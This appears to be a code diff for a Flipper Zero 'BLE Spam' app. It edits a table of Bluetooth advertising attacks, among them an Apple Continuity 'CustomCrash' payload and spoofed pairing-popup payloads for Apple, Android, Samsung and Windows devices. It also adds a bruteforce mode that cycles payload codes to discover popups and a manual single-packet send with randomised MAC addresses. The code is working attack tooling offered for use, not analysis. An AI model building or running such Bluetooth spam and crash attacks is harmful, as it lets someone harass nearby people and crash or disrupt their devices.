@@ -30,13 +30,10 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = false,
-                .cfg =
+                .cfg.continuity =
                     {
-                        .continuity =
-                            {
-                                .type = ContinuityTypeCustomCrash,
-                                .data = {},
-                            },
+                        .type = ContinuityTypeCustomCrash,
+                        .data = {},
                     },
             },
     },
@@ -47,13 +44,10 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = false,
-                .cfg =
+                .cfg.continuity =
                     {
-                        .continuity =
-                            {
-                                .type = ContinuityTypeNearbyAction,
-                                .data = {},
-                            },
+                        .type = ContinuityTypeNearbyAction,
+                        .data = {},
                     },
             },
     },
@@ -64,13 +58,10 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = false,
-                .cfg =
+                .cfg.continuity =
                     {
-                        .continuity =
-                            {
-                                .type = ContinuityTypeProximityPair,
-                                .data = {},
-                            },
+                        .type = ContinuityTypeProximityPair,
+                        .data = {},
                     },
             },
     },
@@ -81,10 +72,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = true,
-                .cfg =
-                    {
-                        .fastpair = {},
-                    },
+                .cfg.fastpair = {},
             },
     },
     {
@@ -94,13 +82,10 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = true,
-                .cfg =
+                .cfg.easysetup =
                     {
-                        .easysetup =
-                            {
-                                .type = EasysetupTypeBuds,
-                                .data = {},
-                            },
+                        .type = EasysetupTypeBuds,
+                        .data = {},
                     },
             },
     },
@@ -111,13 +96,10 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = true,
-                .cfg =
+                .cfg.easysetup =
                     {
-                        .easysetup =
-                            {
-                                .type = EasysetupTypeWatch,
-                                .data = {},
-                            },
+                        .type = EasysetupTypeWatch,
+                        .data = {},
                     },
             },
     },
@@ -128,10 +110,7 @@ static Attack attacks[] = {
         .payload =
             {
                 .random_mac = true,
-                .cfg =
-                    {
-                        .swiftpair = {},
-                    },
+                .cfg.swiftpair = {},
             },
     },
 };
@@ -152,8 +131,17 @@ typedef struct {
     uint8_t delay;
     FuriThread* thread;
     int8_t index;
+    bool ignore_bruteforce;
 } State;
 
+const NotificationSequence solid_message = {
+    &message_red_0,
+    &message_green_255,
+    &message_blue_255,
+    &message_do_not_reset,
+    &message_delay_10,
+    NULL,
+};
 NotificationMessage blink_message = {
     .type = NotificationMessageTypeLedBlinkStart,
     .data.led_blink.color = LightBlue | LightGreen,
@@ -188,7 +176,12 @@ static int32_t adv_thread(void* _ctx) {
 
     while(state->advertising) {
         if(protocol) {
-            protocol->make_packet(&size, &packet, &payload->cfg);
+            if(payload->mode == PayloadModeBruteforce && payload->bruteforce.counter++ >= 10) {
+                payload->bruteforce.counter = 0;
+                payload->bruteforce.value =
+                    (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
+            }
+            protocol->make_packet(&size, &packet, payload);
         } else {
             protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
         }
@@ -220,10 +213,11 @@ static void toggle_adv(State* state) {
     }
 }
 
-#define PAGE_MIN (-4)
+#define PAGE_MIN (-5)
 #define PAGE_MAX ATTACKS_COUNT
 enum {
-    PageHelpApps = PAGE_MIN,
+    PageHelpBruteforce = PAGE_MIN,
+    PageHelpApps,
     PageHelpDelay,
     PageHelpDistance,
     PageHelpInfoConfig,
@@ -265,6 +259,23 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
     canvas_draw_str(canvas, 14, 12, "BLE Spam");
 
     switch(state->index) {
+    case PageHelpBruteforce:
+        canvas_set_font(canvas, FontBatteryPercent);
+        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
+        elements_text_box(
+            canvas,
+            4,
+            16,
+            120,
+            48,
+            AlignLeft,
+            AlignTop,
+            "\e#Bruteforce\e# cycles codes\n"
+            "to find popups, hold left and\n"
+            "right to send manually and\n"
+            "change delay",
+            false);
+        break;
     case PageHelpApps:
         canvas_set_font(canvas, FontBatteryPercent);
         canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
@@ -343,7 +354,7 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
             "App+Spam: \e#WillyJL\e# XFW\n"
             "Apple+Crash: \e#ECTO-1A\e#\n"
             "Android+Win: \e#Spooks4576\e#\n"
-            "                                   Version \e#3.3\e#",
+            "                                   Version \e#4.1\e#",
             false);
         break;
     default: {
@@ -355,20 +366,45 @@ static void draw_callback(Canvas* canvas, void* _ctx) {
         char str[32];
 
         canvas_set_font(canvas, FontBatteryPercent);
-        snprintf(str, sizeof(str), "%ims", delays[state->delay]);
+        if(payload->mode == PayloadModeBruteforce) {
+            snprintf(
+                str,
+                sizeof(str),
+                "0x%0*lX",
+                payload->bruteforce.size * 2,
+                payload->bruteforce.value);
+        } else {
+            snprintf(str, sizeof(str), "%ims", delays[state->delay]);
+        }
         canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
         canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
         canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);
 
         canvas_set_font(canvas, FontBatteryPercent);
-        snprintf(
-            str,
-            sizeof(str),
-            "%02i/%02i: %s",
-            state->index + 1,
-            ATTACKS_COUNT,
-            protocol ? protocol->get_name(&payload->cfg) : "Everything AND");
-        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 21, str);
+        if(payload->mode == PayloadModeBruteforce) {
+            canvas_draw_str_aligned(canvas, 64, 22, AlignCenter, AlignBottom, "Bruteforce");
+            if(delays[state->delay] < 100) {
+                snprintf(str, sizeof(str), "%ims>", delays[state->delay]);
+            } else {
+                snprintf(str, sizeof(str), "%.1fs>", (double)delays[state->delay] / 1000);
+            }
+            uint16_t w = canvas_string_width(canvas, str);
+            elements_slightly_rounded_box(canvas, 3, 14, 30, 10);
+            elements_slightly_rounded_box(canvas, 119 - w, 14, 6 + w, 10);
+            canvas_invert_color(canvas);
+            canvas_draw_str_aligned(canvas, 5, 22, AlignLeft, AlignBottom, "<Send");
+            canvas_draw_str_aligned(canvas, 122, 22, AlignRight, AlignBottom, str);
+            canvas_invert_color(canvas);
+        } else {
+            snprintf(
+                str,
+                sizeof(str),
+                "%02i/%02i: %s",
+                state->index + 1,
+                ATTACKS_COUNT,
+                protocol ? protocol->get_name(payload) : "Everything AND");
+            canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 22, str);
+        }
 
         canvas_set_font(canvas, FontPrimary);
         canvas_draw_str(canvas, 4, 33, attack->title);
@@ -424,6 +460,7 @@ static bool input_callback(InputEvent* input, void* _ctx) {
         consumed = true;
 
         bool is_attack = state->index >= 0 && state->index <= ATTACKS_COUNT - 1;
+        Payload* payload = is_attack ? &attacks[state->index].payload : NULL;
         bool advertising = state->advertising;
 
         switch(input->key) {
@@ -440,27 +477,82 @@ static bool input_callback(InputEvent* input, void* _ctx) {
             }
             break;
         case InputKeyUp:
-            if(is_attack && state->delay < COUNT_OF(delays) - 1) {
-                state->delay++;
-                if(advertising) start_blink(state);
+            if(is_attack) {
+                if(payload->mode == PayloadModeBruteforce) {
+                    payload->bruteforce.counter = 0;
+                    payload->bruteforce.value =
+                        (payload->bruteforce.value + 1) % (1 << (payload->bruteforce.size * 8));
+                } else if(state->delay < COUNT_OF(delays) - 1) {
+                    state->delay++;
+                    if(advertising) start_blink(state);
+                }
             }
             break;
         case InputKeyDown:
-            if(is_attack && state->delay > 0) {
-                state->delay--;
-                if(advertising) start_blink(state);
+            if(is_attack) {
+                if(payload->mode == PayloadModeBruteforce) {
+                    payload->bruteforce.counter = 0;
+                    payload->bruteforce.value =
+                        (payload->bruteforce.value - 1) % (1 << (payload->bruteforce.size * 8));
+                } else if(state->delay > 0) {
+                    state->delay--;
+                    if(advertising) start_blink(state);
+                }
             }
             break;
         case InputKeyLeft:
-            if(state->index > PAGE_MIN) {
-                if(advertising) toggle_adv(state);
-                state->index--;
+            if(input->type == InputTypeLong) {
+                state->ignore_bruteforce = payload ? (payload->mode != PayloadModeBruteforce) :
+                                                     true;
+            }
+            if(input->type == InputTypeShort || !is_attack || state->ignore_bruteforce ||
+               payload->mode != PayloadModeBruteforce) {
+                if(state->index > PAGE_MIN) {
+                    if(advertising) toggle_adv(state);
+                    state->index--;
+                }
+            } else {
+                if(!advertising) {
+                    bool resume = furi_hal_bt_is_active();
+                    furi_hal_bt_stop_advertising();
+                    Payload* payload = &attacks[state->index].payload;
+                    const Protocol* protocol = attacks[state->index].protocol;
+
+                    uint8_t size;
+                    uint8_t* packet;
+                    protocol->make_packet(&size, &packet, payload);
+                    furi_hal_bt_custom_adv_set(packet, size);
+                    free(packet);
+
+                    uint8_t mac[GAP_MAC_ADDR_SIZE];
+                    furi_hal_random_fill_buf(mac, sizeof(mac));
+                    uint16_t delay = delays[state->delay];
+                    furi_hal_bt_custom_adv_start(delay, delay, 0x00, mac, 0x1F);
+                    if(state->ctx.led_indicator)
+                        notification_message(state->ctx.notification, &solid_message);
+                    furi_delay_ms(10);
+                    furi_hal_bt_custom_adv_stop();
+
+                    if(state->ctx.led_indicator)
+                        notification_message_block(state->ctx.notification, &sequence_reset_rgb);
+                    if(resume) furi_hal_bt_start_advertising();
+                }
             }
             break;
         case InputKeyRight:
-            if(state->index < PAGE_MAX) {
-                if(advertising) toggle_adv(state);
-                state->index++;
+            if(input->type == InputTypeLong) {
+                state->ignore_bruteforce = payload ? (payload->mode != PayloadModeBruteforce) :
+                                                     true;
+            }
+            if(input->type == InputTypeShort || !is_attack || state->ignore_bruteforce ||
+               payload->mode != PayloadModeBruteforce) {
+                if(state->index < PAGE_MAX) {
+                    if(advertising) toggle_adv(state);
+                    state->index++;
+                }
+            } else if(input->type == InputTypeLong) {
+                state->delay = (state->delay + 1) % COUNT_OF(delays);
+                if(advertising) start_blink(state);
             }
             break;
         case InputKeyBack:
@@ -488,9 +580,17 @@ static void lock_timer_callback(void* _ctx) {
     state->lock_count = 0;
 }
 
+static void tick_event_callback(void* _ctx) {
+    State* state = _ctx;
+    bool advertising;
+    with_view_model(
+        state->main_view, State * *model, { advertising = (*model)->advertising; }, advertising);
+    scene_manager_handle_tick_event(state->ctx.scene_manager);
+}
+
 static bool back_event_callback(void* _ctx) {
-    Ctx* ctx = _ctx;
-    return scene_manager_handle_back_event(ctx->scene_manager);
+    State* state = _ctx;
+    return scene_manager_handle_back_event(state->ctx.scene_manager);
 }
 
 int32_t ble_spam(void* p) {
@@ -507,7 +607,8 @@ int32_t ble_spam(void* p) {
     Gui* gui = furi_record_open(RECORD_GUI);
     state->ctx.view_dispatcher = view_dispatcher_alloc();
     view_dispatcher_enable_queue(state->ctx.view_dispatcher);
-    view_dispatcher_set_event_callback_context(state->ctx.view_dispatcher, &state->ctx);
+    view_dispatcher_set_event_callback_context(state->ctx.view_dispatcher, state);
+    view_dispatcher_set_tick_event_callback(state->ctx.view_dispatcher, tick_event_callback, 100);
     view_dispatcher_set_navigation_event_callback(state->ctx.view_dispatcher, back_event_callback);
     state->ctx.scene_manager = scene_manager_alloc(&scene_handlers, &state->ctx);
 
